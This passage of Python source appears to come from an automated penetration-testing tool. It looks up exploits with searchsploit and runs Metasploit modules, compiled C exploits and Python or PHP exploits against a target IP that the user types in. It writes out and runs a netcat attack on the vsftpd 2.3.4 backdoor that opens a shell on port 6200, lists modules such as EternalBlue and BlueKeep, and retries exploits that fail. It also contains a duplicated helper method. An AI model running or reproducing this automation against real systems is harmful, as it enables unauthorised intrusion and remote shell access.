            self.console.print(f"[cyan]Using resource script: {resource_path}[/cyan]")
            
            # Run metasploit with the resource script
            try:
                process = subprocess.Popen(
                    ["msfconsole", "-q", "-r", resource_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )
                
                # Poll for output
                while True:
                    output = process.stdout.readline()
                    if not output and process.poll() is not None:
                        break
                    if output:
                        self.console.print(output.strip())
                        
                        # Check for success indicators in the output
                        if "Command shell session" in output or "Meterpreter session" in output:
                            self.console.print("[bold green]Metasploit reports successful exploitation![/bold green]")
                            return True
                
                # If we get here without a success indicator, provide fallback options
                self.console.print("\n[yellow]Metasploit automation completed but success couldn't be confirmed.[/yellow]")
                self.console.print("\n[bold cyan]Alternative methods to try manually:[/bold cyan]")
                self.console.print("1. Run metasploit directly:")
                self.console.print(f"[white]msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; exploit\"[/white]")
                
                self.console.print("\n2. Try a manual netcat approach:")
                self.console.print(f"[white]# In one terminal:[/white]")
                self.console.print(f"[white]echo -e \"USER backdoored:)\\nPASS x\" | nc {target} 21[/white]")
                self.console.print(f"[white]# In another terminal (wait 5 seconds after running the above):[/white]")
                self.console.print(f"[white]nc {target} 6200[/white]")
                
                # Ask user if they want to try manual method
                self.console.print("\n[yellow]Would you like to try the manual netcat method now? (y/n)[/yellow]")
                response = input("> ").strip().lower()
                
                if response.startswith("y"):
                    # Run the manual netcat approach
                    self.console.print("\n[cyan]Running manual netcat exploit...[/cyan]")
                    
                    # Create a temporary script
                    script_path = os.path.join(self.config.output_dir, "vsftpd_manual.sh")
                    with open(script_path, "w") as f:
                        f.write(f"""#!/bin/bash
echo "Sending trigger to vsftpd 2.3.4 on {target}:21..."
echo -e "USER backdoored:)\\nPASS x" | nc {target} 21
echo "Waiting 5 seconds for backdoor..."
sleep 5
echo "Connecting to backdoor on {target}:6200..."
nc -v {target} 6200
""")
                    
                    # Make executable
                    os.chmod(script_path, 0o755)
                    
                    # Run the script
                    self.console.print(f"[cyan]Executing: {script_path}[/cyan]")
                    subprocess.run(["/bin/bash", script_path])
                    
                    # Ask if it worked
                    self.console.print("\n[yellow]Did the exploit successfully give you shell access? (y/n)[/yellow]")
                    result = input("> ").strip().lower()
                    
                    if result.startswith("y"):
                        self.logger.info("User confirmed successful vsftpd exploit")
                        self.console.print("[bold green]Exploitation successful![/bold green]")
                        return True
                
            except Exception as msf_error:
                self.logger.error(f"Error running Metasploit: {msf_error}")
                self.console.print(f"[bold red]Error running Metasploit: {msf_error}[/bold red]")
            
            finally:
                # Clean up temporary file
                try:
                    os.unlink(resource_path)
                except:
                    pass
        
        except Exception as e:
            self.logger.error(f"Error during second vsftpd exploit attempt: {e}")
            self.console.print(f"[bold red]Error during second vsftpd exploit attempt: {e}[/bold red]")
        
        # If we get here, all attempts failed
        self.console.print("\n[yellow]All automatic attempts failed.[/yellow]")
        self.console.print("[yellow]This may be because:[/yellow]")
        self.console.print("1. [yellow]The target is not actually running vulnerable vsftpd 2.3.4[/yellow]")
        self.console.print("2. [yellow]The backdoor is not triggerable from your current position[/yellow]")
        self.console.print("3. [yellow]A firewall is blocking the backdoor port (6200)[/yellow]")
        
        self.console.print("\n[bold cyan]You can try the following manually:[/bold cyan]")
        self.console.print(f"1. [white]nc -v {target} 21[/white] (check if FTP is accessible)")
        self.console.print(f"2. [white]telnet {target} 21[/white] (try to trigger manually with 'USER backdoored:)')")
        self.console.print(f"3. [white]nmap -p 6200 {target}[/white] (check if backdoor port is open)")
        
        return False

    def _is_binary(self, content):
        """
        Check if content appears to be binary
        
        Args:
            content (str): File content
            
        Returns:
            bool: True if content appears to be binary
        """
        # Check for null bytes or high number of non-printable characters
        # which indicates a binary file
        non_printable = 0
        for char in content:
            if char == '\0' or ord(char) > 127:
                non_printable += 1
        
        # If more than 10% is non-printable, it's likely binary
        return non_printable > len(content) * 0.1

    def _extract_metasploit_path(self, exploit_path):
        """
        Extract Metasploit module path from the given exploit path
        
        Args:
            exploit_path (str): The path to the exploit
            
        Returns:
            str: The Metasploit module path, or None if no module path is found
        """
        # Special cases for very common exploits
        if "vsftpd" in exploit_path.lower() and "2.3.4" in exploit_path:
            return "unix/ftp/vsftpd_234_backdoor"
        
        if "eternal blue" in exploit_path.lower() or "ms17-010" in exploit_path.lower():
            return "windows/smb/ms17_010_eternalblue"
        
        if "shellshock" in exploit_path.lower() or "cgi-bin" in exploit_path.lower():
            return "multi/http/apache_mod_cgi_bash_env_exec"
        
        # Common module path patterns
        patterns = [
            r'/(unix|windows|multi|linux)/([^/]+)/([^/]+)$',  # Basic pattern
            r'/(unix|windows|multi|linux)/([^/]+)/([^/]+)/([^/]+)$',  # More specific pattern
            r'/(unix|windows|multi|linux)/([^/]+)/([^/]+)\.rb$',  # Ruby file pattern
        ]
        
        for pattern in patterns:
            match = re.search(pattern, exploit_path)
            if match:
                # Extract the components
                platform = match.group(1)  # unix, windows, multi, linux
                category = match.group(2)  # http, ftp, smb, etc.
                
                # Start building the path
                msf_path = f"{platform}/{category}/"
                
                # Add the rest based on the matched pattern
                if len(match.groups()) >= 3:
                    exploit_name = match.group(3).replace(".rb", "")
                    msf_path += exploit_name
                
                # If there's a 4th component in some cases
                if len(match.groups()) >= 4:
                    sub_exploit = match.group(4).replace(".rb", "")
                    msf_path += f"/{sub_exploit}"
                
                return msf_path
                
        # Try simple pattern extraction for known platforms
        known_platforms = ["unix", "windows", "multi", "linux"]
        known_services = ["ftp", "http", "ssh", "smb", "mysql", "mssql", "postgresql"]
        
        # Check if path contains platform and service
        for platform in known_platforms:
            if f"/{platform}/" in exploit_path.lower():
                for service in known_services:
                    if f"/{service}/" in exploit_path.lower() or service in exploit_path.lower():
                        # Extract name based on file name
                        file_name = os.path.basename(exploit_path)
                        name_part = os.path.splitext(file_name)[0].lower()
                        
                        # Create reasonable path
                        return f"{platform}/{service}/{name_part}"
        
        # Couldn't extract a path
        return None
        
    def _is_binary(self, content):
        """
        Check if content appears to be binary
        
        Args:
            content (str): File content
            
        Returns:
            bool: True if content appears to be binary
        """
        # Check for null bytes or high number of non-printable characters
        # which indicates a binary file
        non_printable = 0
        for char in content:
            if char == '\0' or ord(char) > 127:
                non_printable += 1
        
        # If more than 10% is non-printable, it's likely binary
        return non_printable > len(content) * 0.1

    def display_exploit_instructions(self, exploit_info, target):
        """
        Display detailed instructions on how to use the selected exploit and offer to run it
        
        Args:
            exploit_info: Dictionary with exploit information or string path to exploit
            target: Target IP address
        """
        # Check if exploit_info is valid
        if not exploit_info:
            self.console.print("[red]No exploit information available[/red]")
            return
            
        # If target is localhost or 127.0.0.1, warn and get real target
        if target in ["localhost", "127.0.0.1"]:
            self.console.print("[yellow]Warning: Target is set to localhost. This may not work for exploiting remote systems.[/yellow]")
            target = self.get_target_ip(target)
            if not target:
                return
        
        self.console.print("\n[bold blue]Exploit Information:[/bold blue]")
        
        # Convert string local path to local_path variable
        local_path = None
        if isinstance(exploit_info, str):
            local_path = exploit_info
        elif isinstance(exploit_info, dict):
            title = exploit_info.get('title', 'Unknown Title')
            path = exploit_info.get('path', 'Path not available')
            exploit_type = exploit_info.get('type', 'Unknown')
            platform = exploit_info.get('platform', 'Unknown')
            
            self.console.print(f"Title: [cyan]{title}[/cyan]")
            self.console.print(f"Path: [cyan]{path}[/cyan]")
            self.console.print(f"Type: [cyan]{exploit_type}[/cyan]")
            self.console.print(f"Platform: [cyan]{platform}[/cyan]")
            
            # Clean up path if it has a pipe character
            if path and path.startswith('|'):
                path = path.replace('|', '').strip()
            
            # Try to get the local path of the exploit
            local_path = self.prepare_exploit(path, target)
        
        if local_path:
            self.console.print(f"Local file: [green]{local_path}[/green]")
            
            # Check if this is a Metasploit module
            if "msf" in local_path.lower() or local_path.endswith(".rb"):
                self.console.print("\n[bold green]This is a Metasploit module. Here's how to use it:[/bold green]")
                
                # Extract Metasploit path
                msf_path = self._extract_metasploit_path(local_path)
                if msf_path:
                    self.console.print(f"\n[bold]Run the following commands in msfconsole:[/bold]")
                    self.console.print(f"msfconsole")
                    self.console.print(f"use {msf_path}")
                    self.console.print(f"set RHOSTS {target}")
                    self.console.print(f"show options")
                    self.console.print(f"exploit")
                    
                    # Ask if user wants to run metasploit directly
                    self.console.print("\n[yellow]Would you like to launch Metasploit and run this exploit now? (y/n)[/yellow]")
                    response = input("> ").strip().lower()
                    
                    if response in ["y", "yes", ""]:
                        # Try to run the exploit with msfconsole
                        self.console.print("[cyan]Launching Metasploit...[/cyan]")
                        try:
                            cmd = f"msfconsole -q -x 'use {msf_path}; set RHOSTS {target}; show options; exploit'"
                            self.console.print(f"[green]Running: {cmd}[/green]")
                            subprocess.run(cmd, shell=True)
                        except Exception as e:
                            self.console.print(f"[red]Error running Metasploit: {str(e)}[/red]")
                            self.console.print("[yellow]You can run it manually using the commands shown above.[/yellow]")
                else:
                    # Try to extract from file content
                    try:
                        with open(local_path, 'r', errors='ignore') as f:
                            content = f.read()
                            msf_module_match = re.search(r"['\"]Name['\"].*?['\"]([^'\"]+)['\"]", content)
                            if msf_module_match:
                                module_name = msf_module_match.group(1)
                                self.console.print(f"[green]Found module name: {module_name}[/green]")
                                self.console.print(f"\n[bold]Try these commands in msfconsole:[/bold]")
                                self.console.print(f"msfconsole")
                                self.console.print(f"search {module_name}")
                                self.console.print(f"use <matching_module>")
                                self.console.print(f"set RHOSTS {target}")
                                self.console.print(f"show options")
                                self.console.print(f"exploit")
                            else:
                                self.console.print("[yellow]Could not determine Metasploit module path from the exploit content.[/yellow]")
                                self.console.print("[yellow]Try searching for the module in msfconsole:[/yellow]")
                                self.console.print(f"msfconsole")
                                self.console.print(f"search {os.path.basename(local_path)}")
                    except Exception as e:
                        self.console.print("[yellow]Could not determine Metasploit module path.[/yellow]")
                        self.console.print("[yellow]Try running msfconsole and search for the module manually.[/yellow]")
            
            # Python exploit
            elif local_path.endswith(".py"):
                self.console.print("\n[bold green]This is a Python exploit. Here's how to use it:[/bold green]")
                self.console.print(f"python {local_path} {target}")
                
                # Ask if the user wants to run the exploit now
                self.console.print("\n[yellow]Would you like to run this exploit now? (y/n)[/yellow]")
                response = input("> ").strip().lower()
                
                if response in ["y", "yes", ""]:
                    # Check if the exploit needs to be modified
                    self.console.print("[cyan]Checking if the exploit needs to be modified...[/cyan]")
                    
                    # Try to run the exploit twice if first attempt fails
                    success = False
                    for attempt in range(2):
                        if attempt > 0:
                            self.console.print("\n[yellow]ניסיון שני להרצת ההולשה...[/yellow]")
                            time.sleep(2)  # Wait 2 seconds before retry
                            
                        try:
                            # Run the exploit
                            process = subprocess.run(["python", local_path, target], capture_output=True, text=True)
                            
                            # Check if there were any errors
                            if process.stderr:
                                self.console.print("\n[red]Errors:[/red]")
                                self.console.print(process.stderr)
                            
                            # Check if there was any output
                            if process.stdout:
                                self.console.print(process.stdout)
                            
                            # Check if the process was successful
                            if process.returncode == 0:
                                success = True
                                break
                            elif "Connection refused" in process.stderr:
                                self.console.print("[yellow]החיבור נדחה. מנסה שוב...[/yellow]")
                                continue
                            else:
                                self.console.print(f"[red]ההולשה נכשלה עם קוד שגיאה {process.returncode}[/red]")
                                
                        except Exception as e:
                            self.console.print(f"[red]שגיאה בהרצת ההולשה: {str(e)}[/red]")
                            if attempt == 0:  # Only show retry message on first attempt
                                self.console.print("[yellow]מנסה שוב...[/yellow]")
                    
                    if not success:
                        self.console.print("[red]ההולשה נכשלה בשני הניסיונות[/red]")
                    
            # C exploit
            elif local_path.endswith(".c"):
                self.console.print("\n[bold green]This is a C exploit that needs to be compiled. Here's how to use it:[/bold green]")
                self.console.print(f"gcc -o exploit {local_path}")
                self.console.print(f"./exploit {target}")
                
                # Ask if the user wants to compile and run now
                self.console.print("\n[yellow]Would you like to compile and run this exploit now? (y/n)[/yellow]")
                response = input("> ").strip().lower()
                
                if response in ["y", "yes", ""]:
                    # Compile the exploit
                    self.console.print("[cyan]Compiling exploit...[/cyan]")
                    try:
                        compile_cmd = f"gcc -o exploit {local_path}"
                        subprocess.run(compile_cmd, shell=True, check=True)
                        self.console.print("[green]Compilation successful![/green]")
                        
                        # Run the exploit
                        self.console.print(f"[cyan]Running: ./exploit {target}[/cyan]")
                        subprocess.run(["./exploit", target])
                    except subprocess.CalledProcessError:
                        self.console.print("[red]Compilation failed. The exploit may need modifications to compile.[/red]")
                    except Exception as e:
                        self.console.print(f"[red]Error: {str(e)}[/red]")
            
            # PHP exploit
            elif local_path.endswith(".php"):
                self.console.print("\n[bold green]This is a PHP exploit. Here's how to use it:[/bold green]")
                self.console.print(f"php {local_path} {target}")
                
                # Ask if the user wants to run it now
                self.console.print("\n[yellow]Would you like to run this exploit now? (y/n)[/yellow]")
                response = input("> ").strip().lower()
                
                if response in ["y", "yes", ""]:
                    self.console.print(f"[cyan]Running: php {local_path} {target}[/cyan]")
                    try:
                        subprocess.run(["php", local_path, target])
                    except Exception as e:
                        self.console.print(f"[red]Error running exploit: {str(e)}[/red]")
            
            # Plain text exploit or other type
            else:
                self.console.print("\n[bold green]This looks like a text file with exploit instructions:[/bold green]")
                
                # Try to read the file content
                try:
                    with open(local_path, 'r', errors='ignore') as f:
                        content = f.read()
                    
                    # Check if file is too large
                    if len(content) > 5000:
                        # Show just the first part with relevant instructions
                        self.console.print(content[:5000] + "\n\n[italic]... (content truncated, open the file to see more)[/italic]")
                    else:
                        self.console.print(content)
                except Exception as e:
                    self.console.print(f"[red]Error reading file: {str(e)}[/red]")
                    
                self.console.print(f"\n[yellow]You can view the full exploit instructions in: {local_path}[/yellow]")
        else:
            self.console.print("[yellow]Could not prepare the exploit locally. Try using searchsploit to locate it manually.[/yellow]")
            if isinstance(exploit_info, dict) and 'path' in exploit_info:
                path = exploit_info['path']
                if path.startswith('|'):
                    path = path.replace('|', '').strip()
                self.console.print(f"[yellow]Command: searchsploit -p {path.split('/')[-1].split('.')[0]}[/yellow]")
            else:
                self.console.print("[yellow]Command: searchsploit -p <exploit_name>[/yellow]")
        
        # Always offer the option to perform a custom search
        self.console.print("\n[yellow]Would you like to perform a custom search for more exploits? (y/n)[/yellow]")
        response = input("> ").strip().lower()
        
        if response in ["y", "yes", ""]:
            self.console.print("[cyan]Enter search term (e.g., vsftpd, apache, etc.):[/cyan]")
            search_term = input("> ").strip()
            if search_term:
                vulnerabilities = self.find_vulnerabilities_with_searchsploit(search_term)
                if vulnerabilities and isinstance(vulnerabilities, list):
                    self.console.print("\n[bold blue]Found Vulnerabilities:[/bold blue]")
                    for i, vuln in enumerate(vulnerabilities, 1):
                        if isinstance(vuln, dict):
                            title = vuln.get('title', 'Unknown Title')
                            path = vuln.get('path', 'Path not available')
                            self.console.print(f"{i}. {title} ({path})")
                        elif isinstance(vuln, str):
                            self.console.print(f"{i}. {vuln}")
                    
                    self.console.print("\n[cyan]Select vulnerability number to exploit (or 'q' to quit):[/cyan]")
                    choice = input("> ").strip()
                    
                    if choice.lower() != 'q':
                        try:
                            index = int(choice) - 1
                            if 0 <= index < len(vulnerabilities):
                                selected_vuln = vulnerabilities[index]
                                if isinstance(selected_vuln, dict):
                                    self.display_exploit_instructions(selected_vuln, target)
                                else:
                                    self.console.print(f"[yellow]Selected vulnerability info: {selected_vuln}[/yellow]")
                            else:
                                self.console.print("[red]Invalid selection[/red]")
                        except ValueError:
                            self.console.print("[red]Invalid selection[/red]")
                else:
                    self.console.print("[yellow]No vulnerabilities found for that search term[/yellow]")

    def get_target_ip(self, current_target=None):
        """
        Ask the user for a target IP or use existing one
        
        Args:
            current_target: Current target IP if available
            
        Returns:
            String: Target IP to use
        """
        # Check if we have a valid target already
        if current_target and current_target not in ["localhost", "127.0.0.1"]:
            # We have a valid target
            self.console.print(f"[cyan]Current target: {current_target}[/cyan]")
            self.console.print("[yellow]Would you like to use a different target IP? (y/n)[/yellow]")
            response = input("> ").strip().lower()
            
            if response not in ["y", "yes"]:
                return current_target
        
        # If current target is localhost or user wants to change it
        if current_target in ["localhost", "127.0.0.1"]:
            self.console.print("[yellow]The current target is set to localhost. This may not work for remote exploitation.[/yellow]")
        
        # Try to get target from config
        config_target = None
        if hasattr(self.config, 'target') and self.config.target and self.config.target not in ["localhost", "127.0.0.1"]:
            config_target = self.config.target
            self.console.print(f"[green]Found target in configuration: {config_target}[/green]")
        
        # Ask user for the target
        self.console.print("[bold]Enter the target IP address to attack:[/bold]")
        if config_target:
            self.console.print(f"[dim](Press Enter to use {config_target})[/dim]")
        
        user_input = input("> ").strip()
        
        if not user_input and config_target:
            # Use the target from config
            self.console.print(f"[green]Using target from configuration: {config_target}[/green]")
            return config_target
        elif user_input:
            # Validate IP
            if self._is_valid_ip(user_input):
                self.console.print(f"[green]Using target: {user_input}[/green]")
                return user_input
            else:
                self.console.print(f"[yellow]Warning: '{user_input}' does not appear to be a valid IP address. Using it anyway.[/yellow]")
                return user_input
        else:
            # If all else fails, return current_target or localhost
            return current_target or "localhost"
    
    def _is_valid_ip(self, ip):
        """
        Validate if string is an IP address
        
        Args:
            ip: String to check
            
        Returns:
            Boolean: True if valid IP
        """
        try:
            parts = ip.split(".")
            return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
        except:
            return False

    def run_msfconsole(self, target_ip=None):
        """
        Run msfconsole with a target IP
        // הפעלת msfconsole עם כתובת IP של המטרה

        Args:
            target_ip (str, optional): Target IP address. If not provided, will prompt for one.
        """
        # Get a valid target IP
        if not target_ip or target_ip == "localhost" or target_ip == "127.0.0.1":
            target_ip = self.get_target_ip(target_ip)
        
        self.console.print(f"[bold cyan]Starting Metasploit console targeting {target_ip}[/bold cyan]")
        
        # Ask user if they want to run a specific Metasploit module
        self.console.print("[yellow]Would you like to run a specific Metasploit module? (y/n)[/yellow]")
        response = input("> ").strip().lower()
        
        if response in ["y", "yes"]:
            # List common modules as options
            common_modules = [
                "exploit/unix/ftp/vsftpd_234_backdoor",
                "exploit/multi/http/apache_juddi_upload_exec",
                "exploit/unix/webapp/php_xml_rpc_eval",
                "exploit/windows/smb/ms17_010_eternalblue",
                "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
                "exploit/multi/http/tomcat_mgr_deploy",
                "exploit/multi/http/jenkins_script_console"
            ]
            
            self.console.print("[bold]Common modules:[/bold]")
            for i, module in enumerate(common_modules, 1):
                self.console.print(f"{i}. {module}")
            
            self.console.print("[bold]Enter a module (number from list, full path, or 's' to search):[/bold]")
            module_response = input("> ").strip()
            
            if module_response.isdigit() and 1 <= int(module_response) <= len(common_modules):
                module = common_modules[int(module_response) - 1]
            elif module_response.lower() == 's':
                self.console.print("[bold]Enter search term for Metasploit module:[/bold]")
                search_term = input("> ").strip()
                
                if search_term:
                    try:
                        # Use msfconsole to search for modules
                        search_cmd = ["msfconsole", "-q", "-x", f"search {search_term}; exit"]
                        self.console.print(f"[cyan]Searching for Metasploit modules matching '{search_term}'...[/cyan]")
                        result = run_tool(search_cmd, timeout=30)
                        
                        if result["returncode"] == 0 and result["stdout"]:
                            self.console.print("\n[bold cyan]Search results:[/bold cyan]")
                            self.console.print(result["stdout"])
                            
                            self.console.print("\n[bold]Enter a module path from the results above:[/bold]")
                            module = input("> ").strip()
                        else:
                            self.console.print("[yellow]No results found or search failed.[/yellow]")
                            return
                    except Exception as e:
                        self.console.print(f"[red]Error searching for modules: {str(e)}[/red]")
                        return
                else:
                    self.console.print("[yellow]No search term provided.[/yellow]")
                    return
            else:
                module = module_response
            
            # Ask for additional module options
            self.console.print("[bold]Any additional options? (e.g., 'set LHOST 192.168.1.100') - Enter blank line when done:[/bold]")
            options = []
            while True:
                option = input("> ").strip()
                if not option:
                    break
                options.append(option)
            
            # Build the msfconsole command
            commands = [f"use {module}", f"set RHOSTS {target_ip}"]
            commands.extend(options)
            commands.append("run")
            
            msfconsole_cmd = ["msfconsole", "-q", "-x", "; ".join(commands)]
            
            self.console.print(f"[bold cyan]Running msfconsole with module {module} targeting {target_ip}[/bold cyan]")
            self.console.print(f"Command: {' '.join(msfconsole_cmd)}")
            
            # Try to run the exploit twice if it fails the first time
            try:
                # First attempt
                self.console.print("[cyan]First attempt: Running exploit...[/cyan]")
                result = run_tool(msfconsole_cmd, timeout=300)  # Reduced timeout for first attempt
                
                if result["stdout"]:
                    self.console.print(result["stdout"])
                if result["stderr"]:
                    self.console.print(f"[red]{result['stderr']}[/red]")
                
                # Check for success indicators
                if "Meterpreter session" in result["stdout"] or "Command shell session" in result["stdout"]:
                    self.console.print("[green]First attempt: Session established successfully![/green]")
                else:
                    # Second attempt if the first one didn't establish a session
                    self.console.print("[yellow]First attempt may not have succeeded. Trying a second time...[/yellow]")
                    
                    # Add a slight delay between attempts
                    import time
                    time.sleep(3)
                    
                    # Second attempt with longer timeout
                    self.console.print("[cyan]Second attempt: Running exploit...[/cyan]")
                    result = run_tool(msfconsole_cmd, timeout=600)  # Longer timeout for second attempt
                    
                    if result["stdout"]:
                        self.console.print(result["stdout"])
                    if result["stderr"]:
                        self.console.print(f"[red]{result['stderr']}[/red]")
                    
                    # Check for success indicators again
                    if "Meterpreter session" in result["stdout"] or "Command shell session" in result["stdout"]:
                        self.console.print("[green]Second attempt: Session established successfully![/green]")
                    elif result["returncode"] != 0:
                        self.console.print(f"[red]Command exited with status {result['returncode']}[/red]")
                        
                        # Offer to open a manual msfconsole session
                        self.console.print("[yellow]Would you like to open msfconsole manually to try again? (y/n)[/yellow]")
                        manual_response = input("> ").strip().lower()
                        
                        if manual_response in ["y", "yes", ""]:
                            # Just open msfconsole without any specific module
                            try:
                                self.console.print(f"[cyan]Starting plain msfconsole. Use the following commands when it opens:[/cyan]")
                                self.console.print(f"[green]use {module}[/green]")
                                self.console.print(f"[green]set RHOSTS {target_ip}[/green]")
                                for opt in options:
                                    self.console.print(f"[green]{opt}[/green]")
                                self.console.print(f"[green]run[/green]")
                                
                                # Run msfconsole in a subprocess
                                subprocess.run(["msfconsole"])
                            except Exception as e:
                                self.console.print(f"[red]Error running msfconsole: {str(e)}[/red]")
            except Exception as e:
                self.console.print(f"[red]Error running msfconsole: {str(e)}[/red]")
                
                # Fallback to showing the command
                self.console.print("[yellow]Command failed. Try running msfconsole manually:[/yellow]")
                self.console.print("msfconsole")
        
        else:
            # Just open msfconsole without any specific module
            self.console.print(f"[cyan]Starting plain msfconsole. Use 'set RHOSTS {target_ip}' when needed.[/cyan]")
            
            try:
                # Run msfconsole in a subprocess
                subprocess.run(["msfconsole"])
            except Exception as e:
                self.console.print(f"[red]Error running msfconsole: {str(e)}[/red]")
                
                # Fallback to showing the command
                self.console.print("[yellow]Command failed. Try running msfconsole manually:[/yellow]")
                self.console.print("msfconsole")

    def interactive_exploit_menu(self, service_name, product_name, version, target):
        """
        Interactive menu for exploiting vulnerabilities
        
        Args:
            service_name: Service name
            product_name: Product name
            version: Product version
            target: Target address
        """
        self.logger.info(f"Starting exploit menu for {service_name} {version}")
        
        # Check if target is localhost and request valid IP
        target = self.get_target_ip(target)
        if not target:
            return
        
        # Search for vulnerabilities using searchsploit
        vulnerabilities = self.find_vulnerabilities_with_searchsploit(product_name, version)
        
        if not vulnerabilities or not isinstance(vulnerabilities, list):
            self.console.print("[yellow]No known vulnerabilities found. Would you like to try a custom search?[/yellow] (y/n)")
            response = input("> ").strip().lower()
            
            if response in ["y", "yes", ""]:
                self.console.print("[cyan]Enter search term (e.g., vsftpd):[/cyan]")
                search_term = input("> ").strip()
                vulnerabilities = self.find_vulnerabilities_with_searchsploit(search_term)
        
        if vulnerabilities and isinstance(vulnerabilities, list):
            self.console.print("\n[bold blue]Found Vulnerabilities:[/bold blue]")
            for i, vuln in enumerate(vulnerabilities, 1):
                if isinstance(vuln, dict):
                    title = vuln.get('title', 'Unknown Title')
                    path = vuln.get('path', 'Path not available')
                    self.console.print(f"{i}. {title} ({path})")
                elif isinstance(vuln, str):
                    self.console.print(f"{i}. {vuln}")
            
            self.console.print("\n[cyan]Select vulnerability number to exploit (or 'q' to quit):[/cyan]")
            choice = input("> ").strip()
            
            if choice.lower() != 'q':
                try:
                    index = int(choice) - 1
                    if 0 <= index < len(vulnerabilities):
                        selected_vuln = vulnerabilities[index]
                        if isinstance(selected_vuln, dict):
                            self.display_exploit_instructions(selected_vuln, target)
                        else:
                            self.console.print(f"[yellow]Selected vulnerability info: {selected_vuln}[/yellow]")
                    else:
                        self.console.print("[red]Invalid selection[/red]")
                except ValueError:
                    self.console.print("[red]Invalid selection[/red]")
        else:
            self.console.print("[yellow]No vulnerabilities found[/yellow]")

    def run_web_enumeration(self, web_services):
        """
        Run web service enumeration only - for quick mode
        // הפעלת תשאול שירותי web בלבד - למצב מהיר
        
        Args:
            web_services: List of web services to enumerate
            
        Returns:
            Web enumeration results
        """
        self.logger.info(f"Starting web service enumeration for {self.target}")
        
        # Create progress display
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=self.console
        ) as progress:
            web_task = progress.add_task("[cyan]Performing Web service enumeration...", total=1)
            self._enumerate_web(web_services, quick_mode=True)
            progress.update(web_task, completed=1)
        
        return self.results["web"]

    def _enumerate_web(self, web_services, quick_mode=False):
        """
        Perform web service enumeration
        // ביצוע תשאול שירותי web
        
        Args:
            web_services: List of web services
            quick_mode: If True, only perform directory enumeration without vulnerability scanning
        """
        self.logger.info(f"Performing Web enumeration for {self.target}")
        
        for service in web_services:
            port = service.get("port", 80)
            is_https = service.get("name", "").lower() == "https"
            protocol = "https" if is_https else "http"
            base_url = f"{protocol}://{self.target}:{port}"
            
            try:
                # Run gobuster for directory enumeration
                self.logger.info(f"Running gobuster against {base_url}/")
                gobuster_cmd = [
                    "gobuster", "dir",
                    "-u", base_url,
                    "-w", "/usr/share/wordlists/dirb/common.txt",
                    "-t", "50",
                    "-q"
                ]
                
                if is_https:
                    gobuster_cmd.extend(["-k"])
                
                result = run_tool(gobuster_cmd)
                
                if result.returncode == 0:
                    # Parse gobuster output
                    directories = []
                    files = []
                    
                    for line in result.stdout.decode().splitlines():
                        if line.strip():
                            path = line.split()[0]
                            if path.endswith("/"):
                                directories.append(path)
                            else:
                                files.append(path)
                    
                    self.results["web"][f"{protocol}_{port}"] = {
                        "directories": directories,
                        "files": files
                    }
                    
                    self.logger.info(f"Found {len(directories)} directories and {len(files)} files")
                
                if not quick_mode:
                    # Run nikto vulnerability scan
                    self.logger.info(f"Running nikto vulnerability scan against {base_url}/")
                    nikto_cmd = ["nikto", "-h", base_url, "-nointeractive"]
                    
                    if is_https:
                        nikto_cmd.extend(["-ssl"])
                    
                    result = run_tool(nikto_cmd)
                    
                    if result.returncode == 0:
                        self.results["web"][f"{protocol}_{port}"]["nikto"] = result.stdout.decode()
            
            except Exception as e:
                self.logger.error(f"Error during web enumeration: {str(e)}")
                continue